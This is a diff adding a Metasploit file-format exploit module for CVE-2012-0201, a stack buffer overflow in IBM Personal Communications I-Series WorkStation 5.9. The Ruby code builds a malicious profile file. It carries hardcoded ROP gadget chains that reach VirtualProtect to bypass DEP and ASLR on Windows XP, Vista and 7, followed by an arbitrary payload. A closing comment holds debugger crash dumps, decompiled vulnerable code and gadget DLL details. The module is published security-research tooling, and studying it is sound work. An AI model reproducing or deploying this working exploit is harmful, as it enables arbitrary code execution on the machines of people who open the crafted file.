@@ -1,0 +1,259 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = GreatRanking # ASLR+DEP bypass
+
+	include Msf::Exploit::FILEFORMAT
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'IBM Personal Communications I-Series Access WorkStation 5.9 Profile',
+			'Description'   => %q{
+				The IBM Personal Communications I-Series application WorkStation is susceptible to a
+			stack-based buffer overflow vulnerability within file parsing in which data copied to a
+			location in memory exceeds the size of the reserved destination area. The buffer is located
+			on the runtime program stack.
+
+			When the WorkStation file is opened it will reach the code path at 0x67575180 located in
+			pcspref.dll which conducts string manipulation and validation on the data supplied in the
+			WorkStation file. The application will first check if 'Profile' header exists and appends
+			a dot with the next parameter within the file. It will then measure the character length
+			of the header by calling strcspn with a dot as its null-terminated character.
+
+			It will then write the header into memory and ensure the header ends with a NUL character.
+			The parameter character array is passed to the strcpy() function. The application has
+			declared a 52-element character array for the destination for strcpy function. The
+			function does not perform bounds checking therefore, data can be written paste the end of
+			the buffer variable resulting in corruption of adjacent variables including other local
+			variables, program state information and function arguments. You will notice that the
+			saved RETURN address at offset 0x6c is overwritten by the data written past the buffer.
+
+			To ensure we can perform arbitrary code execution we must we provide a valid pointer at
+			0x74 which is used as a argument for the called function at 0x675751ED as a id file
+			extension parameter. Once the caller regains control we will reach our RETURN. The Ret
+			instruction will be used to pop the overwritten saved return address which was currupted.
+
+			This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform.
+
+			Versions tested:
+			IBM System i Access for Windows V6R1M0 version 06.01.0001.0000a
+			Which bundles pcsws.exe version 5090.27271.709
+
+			Tested on:
+			Microsoft Windows XP     [Version 5.1.2600]
+			Microsoft Windows Vista  [Version 6.0.6002]
+			Microsoft Windows 7      [Version 6.1.7600]
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => 'TecR0c <roccogiovannicalvi[at]gmail.com>',# Discovery & Metasploit module
+			'Payload'       =>
+				{
+					'Space' => 800,
+					'BadChars' => "\x00\x0a\x0d\x3d"
+					# NUL '\0'
+					# LF  '\n' (new line)
+					# CR  '\r' (carriage ret)
+					# =
+				},
+			'Platform'      => 'win',
+			'Targets'       =>
+				[
+					[ 'IBM WorkStation 5.9 (Windows XP SP3)',{} ],
+					[ 'IBM WorkStation 5.9 (Windows 7, Windows Vista)',{} ],
+				],
+			'References'     =>
+				[
+					['CVE', '2012-0201'],
+					['URL', 'https://www-304.ibm.com/support/docview.wss?uid=swg21586166']
+				],
+			'DisclosureDate' => "Feb 28 2012",
+			'DefaultTarget' => 0))
+
+		register_options(
+			[
+				OptString.new( 'FILENAME', [ true, 'The file name.',  'msf.ws' ]),
+			], self.class)
+
+	end
+
+	def nops(rop=false, n=1)
+		return rop ? [0x67A74499] * n : [0x90909090] * n
+	end
+
+	def exploit
+
+		if target.name =~ /Windows 7/ # Plus Windows Vista
+
+			virtualprotect =
+				[
+
+				# - To get to the VirtualProtect Function
+
+				# Since no Import Address Table (IAT) MS function addresses used to bypass Data Execution
+				# Prevention (DEP) are imported within the applications modules which are required as they
+				# have the ability to mark a portion of the stack as executable.
+				# Also randomization of Windows dll's base addresses due to ASLR from Vista+ are enabled by
+				# default. So we cannot directly add the MS function address into our buffer. Therefore, i
+				# decided to do a [dereference] on another IAT address (kernel32.terminateprocess) then add
+				# the difference between two MS functions in kernel32 to obtain my virtualprotect address so
+				# i can still bypass ASLR. The closest i could get to virtualprotect function was 0x10.
+
+				0X641A1EE2,# Removes 0XFFFFFFF0 from stack to EAX for performing calculations
+				0XFFFFFFF0,# Address to get added into EAX
+				0X641C20C0,# NEG operation to subtracts its operand 0XFFFFFFF0 from zero to set 0x10 in EAX
+				0X67202128,# Exchanges the contents of two operands to store our 0x10 into EDX
+				0X641A1EE2,# We then want to store our closest IAT address to VirtualProtect() function
+				0X63B08084,# This is kernel32.terminateprocess used to get close to VirtualProtect()
+				0X6412F404,# We then do a dereference to get the address of kernel32.terminateprocess
+				0X6412E9AE,# We add 0x10 to kernel32.terminateprocess to load kernel32.VirtualProtect
+
+				].pack("V*")
+
+		elsif target.name =~ /XP SP3/
+
+			virtualprotect =
+				[
+
+				0X641A1EE2, # We load our VirtualProtect Address into register EAX
+				0X7C801AD4, # kernel32.VirtualProtect
+
+				].pack("V*")
+		end
+
+		rop_gadgets_p1 =
+			[
+
+			0X67A74498,# Places the next memory address into EDI
+			nops(true, 1),
+			0X6414C496,# Adds the contents of source operand EAX to the destination operation EBX to set dwSize value
+
+			].flatten.pack("V*")
+
+		rop_gadgets_p2 =
+			[
+
+			0X641EC2D5,# Swaps values to get virtualprotect() into ESI
+			0X64164082,# Put 0xFFFFFFC0 into EAX to be subtracted
+			0XFFFFFFC0,# Value will be subtracted to calculate NewProtect
+			0X641C20C0,# EAX equals NewProtect
+			0X67202128,# Swaps values to get NewProtect parameter into EDX
+			0X641F2D59,# Put next memory address into ECX
+			0X67A85090,# &Writable location
+			0X64164082,# Put NOPs into EAX
+			nops,
+			0X641BFDC2,# PUSHAD all parameters for VirtualProtect
+
+			].flatten.pack("V*")
+
+		buffer =  rand_text_alpha(104)
+		buffer << [0X673188A5].pack("V")# Set EBP to a pointer to CALL ESP
+		buffer << [0X64164082].pack("V")# Set EAX to nul
+		buffer << [0XFFFFFC18].pack("V")# Put 0xFFFFFC18 into EAX to be subtracted to calculate dwSize
+		buffer << [0X641C20C0].pack("V")# NEG operation to subtracts its operand 0xFFFFFC18 from zero to set 0x3E8 in EAX
+		buffer << rop_gadgets_p1
+		buffer << virtualprotect
+		buffer << rop_gadgets_p2
+		buffer << payload.encoded
+
+		para_value = rand_text_alpha(3)
+		eol = "\r\n"
+
+		# We only need the header, malicious parameter with value and file extension to trigger the bug
+
+		file =  "[Profile]" << eol
+		file << "#{buffer}=#{para_value}" << eol
+		file << "ID=WS"
+
+		print_status("Creating '#{datastore['FILENAME']}' file for #{target.name}...")
+		file_create(file)
+	end
+
+end
+
+=begin
+(540.25c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=003d1e49 ebx=77c5f7a0 ecx=00000000 edx=6758bdb0 esi=6758bdb1 edi=41414141
+eip=77c483b7 esp=00125360 ebp=0012536c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\MSVCRT.dll -
+MSVCRT!wcsxfrm+0x125:
+77c483b7 8a27            mov     ah,byte ptr [edi]          ds:0023:41414141=??
+
+ModLoad: 76980000 76988000   C:\WINDOWS\system32\LINKINFO.dll
+ModLoad: 67310000 67324000   C:\Program Files\IBM\Client Access\Emulator\PCSWDLG.DLL
+(5dc.65c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=00000751 edx=00009240 esi=004018a0 edi=0012faa0
+eip=42424242 esp=001254e8 ebp=41414141 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
+42424242 ??              ???
+
+signed int __cdecl sub_67575180(const char *HeaderPlusParameter, char *FileExtension, int a3, int a4, int a5)
+{
+  size_t SizeOfHeader;
+  char ParameterName;
+  char Dest[52];
+
+  SizeOfHeader = strcspn(HeaderPlusParameter, ".");
+  strncpy(Dest, HeaderPlusParameter, SizeOfHeader);
+  Dest[SizeOfHeader] = 0;
+  strcpy(&ParameterName, &HeaderPlusParameter[SizeOfHeader + 1]);
+  return sub_67573D80(FileExtension, Dest, &ParameterName, a3, a5, a4);
+}
+
+0:000> da @esp
+0012549c  "AAAAAAAA. .dAAAAAAAAAAAAAAAAAAAA"
+001254bc  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+001254dc  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+001254fc  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0012551c  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0012553c  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0012555c  "AA"
+
+ROP gadgets from images
+Image name: cwbcore.dll
+    Timestamp:        Wed Dec 12 04:15:43 2007 (475EC5BF)
+    CheckSum:         0011CD4C
+    ImageSize:        00118000
+    File version:     12.0.0.0
+    CompanyName:      IBM Corporation
+    ProductName:      IBM(R) System i(TM) Access for Windows
+Image name: PCSXFER.DLL
+    Timestamp:        Wed Dec 12 04:15:48 2007 (475EC5C4)
+    CheckSum:         0007130E
+    ImageSize:        0006B000
+    File version:     5090.1.7103.892
+    CompanyName:      IBM Corporation
+    ProductName:      Personal Communications
+Image name: nstrc.dll
+    CheckSum:         0000F9D6
+    ImageSize:        00009000
+    File version:     5090.0.6171.1308
+    CompanyName:      IBM Corporation
+    ProductName:      Personal Communications
+    FileDescription:  Independent Trace Facility
+Image name: PCSCTSS.DLL
+    Timestamp:        Wed Dec 12 04:15:47 2007 (475EC5C3)
+    CheckSum:         0001D6EB
+    ImageSize:        0007D000
+    File version:     5090.1.7103.892
+    CompanyName:      IBM Corporation
+    ProductName:      Personal Communications
+Image name: PCSWDLG.DLL
+    Timestamp:        Wed Dec 12 04:15:48 2007 (475EC5C4)
+    CheckSum:         0001FCBC
+    ImageSize:        00014000
+    File version:     5090.1.7103.892
+    CompanyName:      IBM Corporation
+    ProductName:      Personal Communications
+=end
